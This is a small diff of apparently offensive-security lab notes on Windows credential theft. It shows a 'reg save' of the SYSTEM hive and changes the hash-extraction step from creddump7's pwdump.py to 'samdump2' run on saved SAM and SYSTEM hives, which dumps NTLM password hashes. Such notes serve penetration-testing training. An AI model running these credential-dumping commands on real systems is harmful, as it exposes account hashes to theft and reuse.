@@ -50,7 +50,7 @@ C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
 
 Now we can decrypt and dump NTLM hash with [creddump.py](https://github.com/CiscoCXSecurity/creddump7)
 ```
-kali@kali:~/creddump7$ python pwdump.py /home/kali/system /home/kali/sam
+samdump2 ~/system ~/sam
 ```
 
 In 2015, Microsoft released Local Administrator Password Solution (LAPS), which offered a
